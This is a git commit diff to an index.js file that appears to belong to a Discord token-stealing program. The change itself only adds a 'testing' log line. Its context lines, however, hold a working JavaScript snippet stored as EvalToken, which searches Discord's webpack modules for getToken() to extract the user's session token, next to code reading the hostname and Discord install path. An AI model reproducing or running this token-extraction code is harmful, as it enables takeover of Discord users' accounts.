cfd2c3d7518b09bb6d70060f4ef91dfa05bb256c
korazzat <75426684+korazzat@users.noreply.github.com>
2021-12-08 21:44:07 -0300

    Update index.js

--- index.js
+++ index.js
@@ -11,6 +11,8 @@ const computerName = os.hostname();
 const discordInstall = `${__dirname}`
 const EvalToken = `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`
 
+console.log('testing')
+
 String.prototype.insert = function (index, string) {
 	if (index > 0) {
 		return this.substring(0, index) + string + this.substr(index);
